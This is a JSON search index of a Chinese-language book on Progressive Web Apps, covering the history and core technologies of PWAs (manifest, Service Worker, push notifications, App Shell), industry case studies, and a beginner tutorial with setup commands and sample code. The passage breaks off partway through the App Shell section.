{"./":{"url":"./","title":"HOME","keywords":"","body":"欢迎走进 PWA 世界！！ Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2018-11-29 11:08:43 "},"chapter01.html":{"url":"chapter01.html","title":"第1章 PWA 介绍","keywords":"","body":"什么是 PWA 随着移动互联网的发展，Native App 开始兴起，那么 Web App 落伍淘汰了吗？很显然答案是没有，它依然生机勃勃，和 Native App 互相依存，还衍生出很多 Native App 和 Web App 相结合的技术，比如 Hybrid App，React Native 等，Angular/ReactJS/Vue 也都是在这期间才发展起来的优秀的框架，可见，Web App 仍在不断进化，PWA（Progressive Web Apps）就是在这背景下诞生的。 本书第一章会着重介绍 PWA 的基础概念，让读者对 PWA 有个大致的了解，后续章节会再深入讲解。本章会探讨为什么会出现 PWA，PWA 的出现解决了哪些问题，然后再看 PWA 的主要技术，并且会结合实际的例子让读者能够创建一个简单的 PWA。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter01/1-how-was-pwa-born.html":{"url":"chapter01/1-how-was-pwa-born.html","title":"1.1 为什么会出现 PWA","keywords":"","body":"为什么会出现 PWA PWA 是 Progressive Web Apps 的缩写，翻译为渐进式网络应用。早在 2014 年， W3C 就公布过 Service Worker 的相关草案，但是其在生产环境被 Chrome 支持是在 2015 年。因此，如果我们把 PWA 的关键技术之一 Service Worker 的出现作为 PWA 的诞生时间，那就应该是 2015 年。在关注 PWA 是什么之前，先来了解一下为什么会出现 PWA，它是在什么样的背景下被提出来的。 回顾一下历史，在 2015 年之前的那段时间，作为前端开发人员，我们主要精力花在哪里，对于我来说，移动站点的性能优化是投入精力很大的一部分，例如提升首屏速度，动画的流畅度，经过一段时间的优化，性能确实有不小的提升，但是无论怎么优化，还是比 Native App 要差很多，始终无法突破移动设备上 WebView 给 Web 的枷锁，这就是我们想说的第一个问题，Web 的用户体验。 除开用户体验问题之外，还有一个非常重要的问题，那就是用户留存。Native App 安装完毕后会在用户手机桌面上有一个入口，让用户打开 App 只需一次点击，而 Web App 在移动时代最主要的入口还是搜索引擎，用户从浏览器到站点需要经过搜索引擎，如果想访问上次同样的内容甚至还需要记住上次的搜索词，用户也可以记住 URL 并进行输入，但这些对于移动用户来说，无疑成本巨大，这就导致 Web 站点和用户之间的粘性非常脆弱。Native App 还能够通过发送通知让用户再次回到应用中来，而 Web 没有这个能力。 最后要说的一个问题是 0 和 1 的问题，Device API 的不完善。Android 和 iOS 提供了非常丰富的设备 API，Native App 只需获取用户授权就可以使用，而在 Web App 中，\bWebView 没有提供这样的 API，完全没法使用，如果我们开发一个需要使用 NFC 的 App，你一定不会考虑 Web，因为近场通信 API 在 Web 中还没有。虽然在近年来，W3C 已经提出了很多新的标准，但是浏览器对于 Device API 的支持仍然很不完善。 Google 在一篇名为《Why Build Progressive Web Apps》的文章中披露过这样的一组数据，Web 站点每个月的 UV 是 Native App 的 3 倍，然而用户在 Native App 花费的时间却是 Web 的 20 倍，如下图所示，这之间巨大的反差，和上面所说的\b三个原因息息相关。 就在这样的背景条件下，PWA 以及支撑 PWA 的一系列关键技术应运而生。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-04-25 17:03:59 "},"chapter01/2-what-is-pwa.html":{"url":"chapter01/2-what-is-pwa.html","title":"1.2 什么是 PWA","keywords":"","body":"什么是 PWA Google 提出 PWA 的时候，并没有给它一个准确的定义，经过我们的实践和总结， PWA 它不是特指某一项技术，而是应用多项技术来改善用户体验的 Web App，其核心技术包括 Web App Manifest，Service Worker，Web Push 等，用户体验才是 PWA 的核心。 PWA 主要特点如下： 可靠 - 即使在网络不稳定甚至断网的环境下，也能瞬间加载并展现 用户体验 - 快速响应，具有平滑的过渡动画及用户操作的反馈 用户黏性 - 和 Native App 一样，可以被添加到桌面，能接受离线通知，具有沉浸式的用户体验 PWA 本身强调渐进式（Progressive），可以从两个角度来理解渐进式，首先，PWA 还在不断进化，Service Worker，Web App Manifest，Device API 等标准每年都会有不小的进步；其次，标准的设计向下兼容，并且侵入性小，开发者使用新特性代价很小，只需要在原有站点上新增，让站点的用户体验渐进式的增强。 Google 在官网一篇名为《Progressive Web App Checklist》的文章中给出了 PWA 的基准线，也给出了体验更好的示范性 PWA 的 Checklist，下面列出了 PWA 的最低要求。 站点需要使用 HTTPS 页面需要响应式，\b能够在平板和移动设备上都具有良好的浏览体验 所有的 URL 在断网的情况下有内容展现，不会展现浏览器默认页面 需要支持 Wep App Manifest，能\b被添加到桌面 即使在 3G 网络下，页面加载要快，可交互时间要短 在主流浏览器下都能正常展现 动画要流畅，有用户操作反馈 每个页面都有独立的 URL PWA 的特性 PWA 本质上还是 Web App，借助了新技术具备了一些 Native App 的特性，所以它兼具 Web App 和 Native App 的优点，同时在安全、体验和用户黏性三个方面都有很大的提升。总结下来，PWA 具有如下特性。 渐进式 - 适用于所有浏览器，因为它是以渐进式增强作为宗旨开发的 连接无关性 - 能够借助 Service Worker 在离线或者网络较差的情况下正常访问 类原生应用 - 由于是在 App Shell 模型基础上开发，因此应具有 Native App 的交互，给用户 Native App 的体验 持续更新 - 始终是最新的，无版本和更新问题 安全 - 通过 HTTPS 协议提供服务，防止窥探，确保内容不被篡改 可索引 - manifest 文件和 Service Worker 可以让搜索引擎索引到，从而将其识别为『应用』 黏性 - 通过推送离线通知等，可以让用户回流 可安装 - 用户可以添加常用的 Web App 到桌面，免去到应用商店下载的麻烦 可链接 - 通过链接即可分享内容，无需下载安装 PWA 的这些新特性给 Web App 注入了活力，而 Native App 却没能很好的弥补自己的劣势。对于 Native App来说，最大的痛点是由于其天生封闭的基因，内容无法被索引，这会导致 Native App 很难被分发，例如，用户想知道红烧肉的做法，还需要先知道应用的名称，下载应用之后才能获取内容，这个流程十分不合理，根据 Google 的统计，用户每个月安装的应用个数约等于 0，再加上用户 80% 的时间被 Top3 的超级应用占据，应用分发成本也因此越来越高。相对于 Native App 的封闭，PWA 完全是开放的，PWA 的所有技术都是遵循开放的标准，因此能够被浏览器快速支持，被开发者接受。 下表列出了传统 Web App，Native App 和 PWA 在各特性的对比。 是否可安装 是否可链接访问 用户体验 用户黏性 传统 Web 无法安装 可链接访问 体验一般 黏性差 Native App 可安装 不可链接访问 体验好 黏性强 PWA 可安装 可链接访问 体验好 黏性强 PWA 能给站点体验带来飞跃式的提升，我们可以用移动设备上的浏览器，如 Chrome， 访问 LAVAS 官网 体验一下，并添加到桌面，还可以在断网的情况下使用。现在在国内也有很多 PWA 站点，比如饿了么和新浪微博的移动版，不用耗费流量下载几十兆的应用，就能有和原生应用一样的体验，不妨尝试一下。 在后面的章节中，我们会从体验、安全和性能三个角度来分析如何打造一个好的 PWA。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter01/3-what-are-key-techs.html":{"url":"chapter01/3-what-are-key-techs.html","title":"1.3 PWA 的核心技术","keywords":"","body":"PWA 的核心技术 前文提到，PWA 的核心是用户体验，能让 PWA 达到原生应用的体验并不仅仅依赖于某一项技术，而是多管齐下，进行改进，从而在安全、性能和体验上都获得很大的提升。下面将简单介绍几个 PWA 应用中经常使用到的技术，后面的章节会进行更详细的讲解。 Web App Manifest Web App 是依附于浏览器的，在一般情况下，用户需要先打开浏览器，然后输入网址或点击收藏的书签，才能够访问到网页内容，相比在移动设备主屏上拥有一席之地的 Native App，Web App 使用起来太麻烦了，这也是 Native App 相比 Web App 用户黏性更好的原因之一。因此 Web App 也需要这个能力，Web 应用清单（Web App Manifest）能够帮助我们实现这一点，也是 PWA 最核心的功能之一，开发者可以定义用户添加到主屏的图标、应用名称等，也许有人会说，有些移动设备上的浏览器可以在主屏上添加网页的快捷方式，但其实用户体验区别很大，Web App Manifest 允许开发者配置隐藏浏览器多余的 UI（地址栏，导航栏等），让 PWA 具有和 Native App 一样的沉浸式体验。 Web App Manifest 体现在代码上主要是一个 JSON 文件：manifest.json，开发者可以在这个 JSON 文件中配置 PWA 的相关信息，应用名称、图标、启动方式、背景颜色、主题颜色等等。添加到桌面后，PWA 并不是一个快捷方式，而是能够在系统中作为一个独立的 App 存在的，用户可以设置它的权限，清除它的缓存，就和 Native App 一样。 添加主屏的好处是显而易见的，首先它缩短了用户和站点的距离，用户可以在主屏直达站点；其次是能够让网站具有更加接近 Native App 的体验，具有启动画面、沉浸式浏览体验；最后，PWA 会被系统的应用商店收录，目前只有 Windows 10 这样做了，但是可以预见在不远的将来，其他的主流平台也会进行收录。 Service Worker 在前文中，频繁的提及 Service Worker 是因为它真的很重要，毫不夸张的说，Service Worker 就像人体中心脏一样的存在，如果没有它，PWA 就像没有了动力，无法寸进。 Service Worker，直白的翻译就是服务工作线程，但一般我们不会这么做。它是浏览器在后端独立于网页主进程运行的脚本，它可以拦截网络请求，可以操作本地缓存，还可以接受服务器推送的离线消息，它的功能很丰富，并且 Service Worker 可扩展性很强，想象空间比较大，未来 PWA 很多的特性会基于 Service Worker 来设计，这也是笔者为什么说它是 PWA 的心脏。 简单归纳一下，Service Worker 的特点，如下： 一个特殊的 worker 线程，独立于当前网页主线程，有自己的执行上下文 一旦被安装，就永远存在，除非显示取消注册 使用到的时候浏览器会自动唤醒，不用的时候自动休眠 可拦截并代理请求和处理返回，可以操作本地缓存，如 CacheStorage，IndexedDB 等 离线内容开发者可控 能接受服务器推送的离线消息 异步实现，内部接口异步化基本是通过 Promise 实现 不能直接操作 DOM 必须在 HTTPS 环境下才能工作 Service Worker 在 PWA 中最重要的功能就是离线与缓存，在本书第三章，还会有很多笔墨来介绍 Service Worker 如何实现站点离线。 离线通知 Service Worker 是 PWA 很多功能的基础，正是有了 Service Worker，其他功能才能发挥更大的作用，离线通知就是其中之一。 离线通知是指在用户没有打开 PWA 站点的情况下，也能接受到服务器推送过来的通知并展现给用户，其中包括了两部分，离线推送和展现通知，分别是 Web Push 和 Notification API。 推送通知是一种时效性非常强的与用户沟通的方式，即使在 PWA 没有打开的情况下，依然可以触达用户，能够立即引起用户的注意，对于一些突发事件、限时活动、重大升级等时效性要求很高的场景，推送通知总是最好的选择，这也是过去 Native App 强于 Web App 的原因之一。因此 PWA 提供了 Web Push 和 Notification API 补全了这一功能。 浏览器在接受到对应的消息服务中心推送过来的离线消息时，会唤醒对应站点注册的 Service Worker，开发者可以在 Service Worker 文件中处理接受到的请求，显示通知。 Web Push 和 Notification API 在后面的章节也会重点介绍。 App Shell 和骨架屏 App Shell 是 PWA 强调的一个非常重要的设计理念，它能够缩短用户进入页面时的白屏时间，让用户一进入 PWA 就能快速看到 PWA 的整体框架，就和 Native App 一样。从概念上讲，App Shell 是 PWA 界面展示所需的最小资源集合，即让页面能够正常运行起来的最小的 HTML、CSS 和 JavaScript 等静态资源集，每个页面都需要加载这一部分资源。利用 Service Worker 把这部分资源缓存在本地，就能够在打开 PWA 时不需要从服务器端获取这部分资源，从而能够瞬间渲染出页面框架，不仅提升了首屏的速度，还减小了站点流量的消耗。 骨架屏（App Skeleton），也是提升首屏体验的有效方式。它的原理是在真实内容渲染完成之前，使用一些能够快速渲染的静态图片/样式/色块/部分真实内容进行占位，让用户对真实内容区域有心理预期。App Shell 和骨架屏都是提升首屏体验的绝好妙招。 App Shell 和骨架屏相辅相成，App Shell 显示页面的外框部分，初始内容就用骨架屏来填充，保证主体内容区域不会留白，它的特点是： 在页面加载初期预先渲染内容，提升感官上的体验 一般情况骨架屏和实际内容的结构是类似的，因此之后的切换不会过于突兀。这点和传统的 Loading 动图不同，可以认为是其升级版 只需要简单的 CSS 支持 (涉及图片懒加载可能还需要 JS )，不要求 HTTPS 协议，没有额外的学习和维护成本 如果页面采用组件化开发，每个组件可以根据自身状态定义自身的骨架屏及其切换时机，同时维持了组件之间的独立性 App Shell 和骨架屏在提升首屏体验上发挥了重要作用，本书第二章会首先介绍，在了解了这部分内容之后，就能够很好的理解 App Shell 结合 Service Worker 的重要性。 以上四点是笔者认为对应 PWA 非常重要的技术，因此列出来，并且后续也会重点讲述，其他在这里没有提到的技术对于 PWA 来说也同样重要，在本书中不会重点讲述，但也会有所提及，开发者可以去阅读一些相关的文档或者标准，比如 MDN 站点。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter01/4-how-is-pwa-going.html":{"url":"chapter01/4-how-is-pwa-going.html","title":"1.4 PWA 的发展","keywords":"","body":"PWA 的发展 从 PWA 被提出到现在，已经过去了 4 年，PWA 取得的成绩有目共睹，特别是在国外，在网络速度不够快或者相对贫困的地区，PWA 非常受欢迎，因为它不需要很高的硬件配置，也很省流量，比如在印度，就有一个很成功的案例，Flipkart。 Flipkart Flipkart 是印度最大的电商公司，在 2015 年的时候，他们关停了 Web App，尝试将用户导流到 Native App，后来发现在产品快速迭代和好的用户体验之间很难做到两者兼得，因此他们决定将 Web App 和 Native App 整合为 PWA，通过 Service Worker，Web App Manifest 等技术的使用，PWA 不仅在体验上达到了他们的标准，同时还具有了 Web App 的产品迭代速度。 采用 PWA 后，取得的成绩斐然，关键收益如下： 用户时长增加了 3 倍，传统 Web 是 70 秒，而 PWA 达到了 3.5 分钟。 用户回流率提升了 40%。 添加到主屏的用户转化率提高了 70%。 用户数据流量的消耗降低了 3 倍。 阿里速卖通(AliExpress) 阿里速卖通是阿里巴巴旗下的一款产品，对外销售来自中国的各种产品。AliExpress 的困境在于，用户不愿意下载安装他们的 Native App，即使在 Web App 中对 Native App 有足够的引流，导致获客成本很高。 最后，AliExpress 选择了 PWA，他们的出发点在于提升 Web App 的\b体验和用户黏性。带来的收益也非常的明显，如下： 在 PWA 中，新用户的转化率提升了 104%。 在一次会话中，用户访问的页面数量\b增加了 2 倍。 用户时长增加了 74%。 饿了么 不仅在国外，国内同样也有 PWA 的案例，饿了么，作为国内最早一批尝试 PWA 的站点，同样也取得了不小的收益。 饿了么做 PWA 站点的出发点和 Flipkart、AliExpress 不完全一样，它几乎纯粹是从性能优化的角度接入的 PWA，当时国内的浏览器市场比较混乱，对 PWA 支持的不是很完善。饿了么 PWA 采取的是多页应用（Multi-Page Application），和 PWA 推荐的 SPA（Single Page Application）不一样，主要是考虑到多个团队合作共同开发同一个站点，不过在体验上并没有打折扣，现在是 Google 对外展示的一个成功案例。 看一下饿了么 PWA 的收益： 预缓存的页面加载时间缩短了 11.6%。 所有页面平均加载时间缩短了 6.35%。 在 3G 网络下，第一次加载首次可交互时间缩短了 4.93 秒。 标准的支持 PWA 采用的最新技术，当前浏览器还没有达到完全支持的程度，很多技术在 W3C 还没有定稿，不过这也意味着这些技术的还有很大的想象空间。 根据 Can I Use 的统计（包括 PC 和移动端，截至 2019 年 4 月 2 日），PWA 的关键技术在浏览器中的支持度如下： Web App Manifest 的支持度达到 80.63%。 Service Worker 的支持度达到 89.84%。 Notifications API 的支持度达到 75.17%。 Push API 的支持度达到 78.06%。 随着标准的进一步完善，国内外各大浏览器都会逐步支持，拥抱标准。Chrome 自不必说，Apple 从 iOS 11.3 版本开始在 Safari 上支持 Service Worker，iOS 12.2 版本修复了 PWA 很多致命的体验问题，支持了 Web Share API 等。可见大家都在拥抱标准，拥抱开放。 Can I Use 的统计由于一些原因在国内不是很适用，为此百度 Web 生态团队维护了一份列表，开发者可以在上面查看国内各主流浏览器对 PWA 主要技术的支持程度，https://lavas.baidu.com/ready。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-22 14:25:16 "},"chapter01/5-the-future-of-pwa.html":{"url":"chapter01/5-the-future-of-pwa.html","title":"1.5 PWA 的未来","keywords":"","body":"PWA 的未来 从 Google 最初提出 PWA 到现在，PWA 已经有不小的改变了，这就是 Web 的魅力，遵循标准且完全开放的魅力，来自世界各地的开发者参与标准的制定，它还在不断进化，Web 即使已经 30 岁了，它还依旧是被广泛应用的技术之一。 关注 Web 标准化的开发者会在标准文档里发现很多有意思的提案，有 Web 蓝牙、Web XR 等，在 TPAC Lyon 2018 上，Intel 的开发者演示了他们开发的 Web Machine Learning 的 DEMO，Web 也能直接利用 NPU 来进行深度学习的计算，让我觉得 Web 还能再战 30 年，我对此充满信心。 在国外，PWA 已经被广泛应用，也被用户所接受。在笔者刚从事 Web 生态相关工作的时候，国内才刚刚接触到 PWA 这个概念，UC 浏览器的内核版本还是 Chrome 3x，连 ES6 都支持的不全，更别说是 Service Worker、Web App Manifest 等 PWA 技术了。UC 浏览器并不是个例，国内厂商 App 内核版本几乎都不支持 Service Worker。不过也就在不到一年的时间里，这些浏览器就都支持了 Service Worker，让人不得不感叹国内互联网进步之快，国内主流浏览器对 Service Worker 的支持度如下图所示。 除了 Service Worker 等主流 PWA 技术外，W3C 也一直在推进 Device API 的标准。在 MDN，有一个 Web API 的索引，WebAPI，里面列出了大部分的现存的 Device API 和其他的 API。 Accelerated Shape Detection in Imagges 是形体检测的 API，在最新的 Chrome 中已经支持，如下代码所示。 需要将 chrome://flags/#enable-experimental-web-platform-features 设置为 Enabled。 // 人脸识别 const faceDetector = new FaceDetector({fastMode: true, maxDetectedFaces: 1}) // 假设 theImage 是 标签中的内容或者一个 Blob 对象 faceDetector.detect(theImage) .then(detectedFaces => { for (const face of detectedFaces) { console.log( ` Face @ (${face.boundingBox.x}, ${face.boundingBox.y}),` + ` size ${face.boundingBox.width}x${face.boundingBox.height}`); } }).catch(() => { console.error(\"Face Detection failed, boo.\"); }) 不断有新的 Device API 被支持，W3C 等标准组织有一群对 Web 怀抱希望，希望 Web 成为开放技术的人，他们在努力推进 Web 用户体验的提升，虽然由于 W3C 的组织方式和对安全、隐私、性能的考虑，推进速度不是很快，但不久也会被所有浏览器支持。我喜欢 Web 的开放，喜欢它的简单。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter01/6-your-first-pwa.html":{"url":"chapter01/6-your-first-pwa.html","title":"1.6 你的第一个 PWA","keywords":"","body":"你的第一个 PWA 本书中大部分示例均基于下面的这个模板展开，开发者可以跟随书中示例逐步操作，加深理解。在这个示例里，我们一起来实现一个能添加到桌面并且离线可用的 PWA。 准备工作 在准备编写第一个 PWA 前，有一些准备工作需要准备，需要安装一些必备的软件，如下： 一台可以正常联网的计算机并已安装较新版本的 Node.js，npm，Git 一个方便调试并支持 Service Worker 的浏览器，推荐使用 Google Chrome 一部安卓手机，开启添加到桌面的权限，推荐安装好 Chrome 浏览器 一个自己习惯的文本编辑器，如 Visual Studio Code, Sublime Text 等等 下载代码 在完成上面的准备工作后，接下来下载笔者准备的示例代码。本书的示例代码均托管在 GitHub 上，地址是 https://github.com/lavas-project/pwa-book-demo。 本书所有的 JS 代码均符合 JavaScript Standard Style 规范。 那么接下来的第一步，我们先下载代码到本地，在命令行中运行如下命令。 # 从 GitHub 下载代码到本地 pwa-book-demo 目录 $ git clone https://github.com/lavas-project/pwa-book-demo.git # 进入到 chapter01 目录 $ cd chapter01 # 安装 npm 依赖 $ npm install # 安装成功后启动 chapter01 示例 $ npm run server 在看到命令行中输出 Server start on: http://127.0.0.1:8088，意味着已经成功启动，这时，打开浏览器，访问 http://127.0.0.1:8088 能看到如下图所示的页面。 接下来，开发者可以根据下面的步骤逐步开启 Web App Manifest 和 Service Worker，开始体验自己的第一个 PWA。 添加到主屏 根据前面的章节介绍，增加用户黏性最好的方式是把这个 PWA 放在用户的主屏上，它背后的技术就是 Web App Manifest，接下来，我们就来看看如何使用。 第一步，站点需要新增一个文件：manifest.json，这个文件中包含站点的名称、图标地址、入口地址、显示模式等信息，并且通过一个地址能够访问到该文件，在我们下载下来的代码中，这个文件在 chapter01/public/ 目录下，启动调试服务器后，可以通过 http://127.0.0.1:8088/manifest.json 访问到。 { \"name\": \"PWA Chapter01 Demo\", \"short_name\": \"Chapter01 Demo\", \"icons\": [ { \"src\": \"assets/images/icons/icon_144x144.png\", \"sizes\": \"144x144\", \"type\": \"image/png\" }, { \"src\": \"assets/images/icons/icon_152x152.png\", \"sizes\": \"152x152\", \"type\": \"image/png\" }, { \"src\": \"assets/images/icons/icon_192x192.png\", \"sizes\": \"192x192\", \"type\": \"image/png\" }, { \"src\": \"assets/images/icons/icon_512x512.png\", \"sizes\": \"256x256\", \"type\": \"image/png\" } ], \"start_url\": \"/index.html\", \"display\": \"standalone\", \"background_color\": \"#fff\", \"theme_color\": \"#1976d2\" } 第二步，在 HTML 页面中添加对 manifest.json 文件的引用，在示例中，打开 chapter01/public/index.html 文件，添加如下代码到 中。 第三步，在\b移动端浏览器 Chrome 中打开启动的地址，如果在同一个局域网内，可以通过电脑的 IP 地址访问，\b比如笔者的电脑的局域网 IP 是 192.168.0.100，那么就可以通过 http://192.168.0.100:8088/ 访问。访问成功后，点击添加到桌面按钮，PWA 就会出现在主屏上，如下图所示。 点击 PWA 的图标，\b不仅具有启动画面，还具有完全沉浸式的体验，如下图所示。 Web App Manifest 的内容远不止这些，可以阅读本书的后续章节，会详细介绍。 如果添加到主屏始终不成功，可以阅读本书的第五章，相信会解决您的问题。 离线可用 离线可用依赖于 Service Worker 的应用，接下来来看看在示例代码中如何启用 Service Worker。 第一步，您需要一个 Service Worker 文件，在示例中，可以查看 chapter01/public/sw.js 文件，并且可以通过 http://127.0.0.1:8088/sw.js 访问到该文件，sw.js 文件具体的内容会在后续章节逐步讲解。 第二步，在 HTML 页面中注册 Service Worker。打开 chapter01/public/index.html 文件，找到下面的代码，并将注释打开。 // 判断浏览器是否支持 Service Worker if ('serviceWorker' in navigator) { // 在 load 事件触发后注册 Service Worker，确保 Service Worker 的注册不会影响首屏速度 window.addEventListener('load', function () { // 注册 Service Worker navigator.serviceWorker.register('/sw.js').then(function (registration) { // 注册成功 console.log('ServiceWorker registration successful with scope: ', registration.scope) }).catch(function (err) { // 注册失败 :( console.warn('ServiceWorker registration failed: ', err) }) }) } 第三步，接下来可以通过打开电脑上的 Chrome 来验证是否注册成功，并且是否离线可用。 通过 Chrome 访问 http://127.0.0.1:8088 打开我们的第一个 PWA，\b并且打开调试工具，点击 Application \b菜单栏，再点击调试工具左边的 Service Worker 选项，会看到\b sw.js 的注册信息，如下图所示： 那么，我们检查一下是否真的离线可用，勾选上图中的 Offline 复选框，让 Chrome 在这个标签页下保持断网状态。 \b接下来，刷新页面，您会发现页面依然能正常渲染，这就是 PWA 的离线可用，可以利用 Service Worker 做很多事情，缓存页面\b框架和骨架屏，提升页面首屏速度，甚至可以缓存部分数据。Service Worker 将在本书的后续章节会重点讲述。 总结 以上就是您的第一个 PWA，麻雀虽小，五脏俱全，能被添加到主屏，能离线可用，\b短短的几行代码就在原站点的基础上实现了这两个功能，并且没有侵入性，代价也很小，它确实奉行渐进式的原则。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-22 14:25:16 "},"chapter02.html":{"url":"chapter02.html","title":"第2章 设计与体验","keywords":"","body":"设计与体验 PWA 的提出包含了很多新的技术，如 Service Worker 等，但用户体验才是它的核心，用户体验包括很多方面，速度、顺滑度、阅读体验等，这不是单靠设计师能做到的，需要设计与技术互相配合，设计配合技术，技术实现设计。设计师需要考虑如何缩短用户转化流程，如何布局，让用户能方便快捷的获取信息，还需要考虑如何配合技术达到最佳用户体验；开发人员同样需要考虑采用使用什么技术来达到体验最优。 本章会从体验原则、App Shell、骨架屏和响应式布局来分析设计和技术如何互相配合来达到最佳体验。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter02/1-what-is-good-ux.html":{"url":"chapter02/1-what-is-good-ux.html","title":"2.1 什么是好的用户体验","keywords":"","body":"什么是好的用户体验 PWA 的核心是用户体验，它的核心技术（如 Service Worker，Web App Manifest 等）都是为了提升 Web App 用户体验，但“体验”其实是个很主观的感受，我们很难用一个或几个量化指标来轻易的衡量用户体验，判断优劣，甚至不同的人有不同的理解，不过体验好的站点都有一些共性，包括不限于下面列出来的一些特征。 首屏速度快 顺滑流畅的动画效果 有用户操作的反馈 比较简单的操作步骤 主体内容比较在最显眼的位置 整站体验一致 无障碍访问，不同的人群均可使用 用户体验的核心是用户，设计师需要站在用户的角度思考用户需要什么，在做设计的时候需要做充分的调研。移动设备上的用户目的性很强，需要在巴掌大小的屏幕上快速找到自己想要的内容。 很多公司都沉淀了自己的一套设计原则和方案，百度在 2018 年发布了《百度移动搜索落地页体验白皮书 4.0》，这里面列出了很多体验上的指导原则。Google 也在开发者网站上列出了他们总结的 25 项设计原则，《What Makes a Good Mobile Site?》。 笔者将他们整合了一下，并且加入了一些自己认为重要的设计原则，如下： 主操作区域要放在显眼位置 不要出现巨大的弹层盖住主要内容，比如下载条幅可以放在顶部并且添加关闭按钮 推送的通知需要满足准确、准时和相关三个特征 尽量减少用户的输入或者减小输入的代价，自动帮用户填写已知的数据，选择合适的 input 类型 缩短不必要的流程，让整个转化流程更简洁 响应式布局，\b让站点\b在不同尺寸的浏览器上都有好的体验 图片清晰，且点击可放大查看更清晰的图片 \b避免不必要的切换，让用户在一个\b浏览窗口内完成所有的操作 如果需要申请设备权限，如定位、通知等，在申请前需要明确的告诉用户为什么需要这些设备权限 可点击区域的\b宽度和高度不应小于 48px 整站体验需要一致，页面框架、主色调等需要保持统一 好的设计原则远不止\b上面列出来的这些，好的设计不仅需要美观，还需要方便易用。 那么站在开发者的角度，哪些需要重点关注呢？ Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-04-25 17:03:59 "},"chapter02/2-design-and-tech.html":{"url":"chapter02/2-design-and-tech.html","title":"2.2 设计与技术","keywords":"","body":"设计与技术 好的设计没有好的技术来实现同样无法达到最佳的用户体验。 设计与技术并不只是实现的关系，而是需要互相配合，再完美的设计如果不能实现，那也只是白费，而一些技术上的优化也需要设计给予配合才能更加完美。 上一节中，列出了很多设计原则，有些是比较容易实现的，但有些也比较复杂，复杂到需要很大的篇幅来描述。下面我们总结了几个比较重要的设计与技术相结合的问题。 首屏速度 首先是首屏速度，它对于站点的重要性不言而喻，特别是移动端，下图是页面加载时间与跳出率和会话\b的关系。 那么技术上如何提升首屏速度呢？首选我们会想到\b将 CSS 放在头部，JS 放在页面底部等技术手段，这些方法确实卓有成效，但是有没有更好的方法呢？ 在这里就要讲到设计与技术相辅相成的一种 Web 的设计，那就是 App Shell，以及和 App Shell 配套使用的骨架屏（App Skeleton），本章后续会详细介绍。 响应式布局 移动设备种类越来越多，屏幕大小不一，有小到高宽不足 40\b 毫米的\b智能手表，也有高度接近 300 毫米的 iPad。尽管如此，大部分的 Web 站点都没有对尺寸不一的设备做过适配，导致在移动端体验很差，这时就凸显响应式布局的重要性。 响应式布局不是一个纯技术的问题，\b在设计之初就\b需要设计师考虑众多问题，例如在不同尺寸的设备上，字体大小设置多少，页面如何布局，主体内容放在哪里，叠起来的内容如何使用户更方便的找到，小尺寸屏幕如何展现列数较多的表格，等等。 而开发者需要考虑如何实现根据\b屏幕尺寸大小动态调整字体大小或者布局，其中涉及到的知识点\b很多，在本章后续小节中会详细介绍。 流畅的动画 动画是体验非常重要的一部分，站点展现速度再快，没有任何交互动画，也会显得没有生气，它赋予了站点“生命”。但是如果动画掉帧，造成卡顿，反而会让用户觉得站点体验很差，所以，我们需要的是流畅的动画。 动画的设计没有想象中的简单，过多的动画和没有动画体验同样糟糕，动画过多会让用户觉得烦躁，因此需要设计师在初期考虑到参与动画的元素、动画的类型、动画的持续时间等，而\b开发者需要考虑如何实现流畅的动画。在本章后续小节中同样会展开介绍。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter02/3-app-shell.html":{"url":"chapter02/3-app-shell.html","title":"2.3 App Shell","keywords":"","body":"App Shell 在第一章中已经简单介绍过 App Shell，这个小节我们会更深入学习如何构建和使用 App Shell。它并不是一种新的技术或者 API，而是设计与技术相结合产生的一种整站设计方案，减少用户进入页面的等待时间，用户能够快速看到页面的主体结构，虽然这时主体内容没有渲染出来，但是给用户感官上的体验是这个页面渲染很快，那么来看一下什么是 App Shell。 什么是 App Shell PWA 多数采用单页应用（Single Page Application）的方式编写，这样能减少页面跳转带来的开销，并且开发者可以在页面切换时增加过渡动画，避免出现加载时的白屏。那么在页面切换时页面上固定不动的内容就是 App Shell 的一部分。 应用从显示内容上可以粗略的划分为内容部分和外壳部分。App Shell 就是外壳部分，即页面的基本结构，如下图所示： 上面只是 App Shell 显示的部分，那么是谁去加载内容区域呢，是谁接管了页面的状态呢，是谁初始化页面的样式呢？ 也是 App Shell，它不仅包括用户能看到的页面框架部分，还包括用户看不到的代码逻辑。因此，我们可以总结一下 App Shell 的定义，App Shell 是页面能够展现所需的最小资源集合，即支持用户界面所需的最小的 HTML、CSS 和 JavaScript 等静态资源集合。采用 App Shell 的站点，每个页面都会先加载 App Shell 的内容，再由 App Shell 根据当前页面 URL 渲染对应的主体内容。 上图给出了基本的 App Shell 例子，它包含头部导航，侧边栏等，对于一个应用来说它有一个相对稳定的结构。但是一个站点可以有多个 App 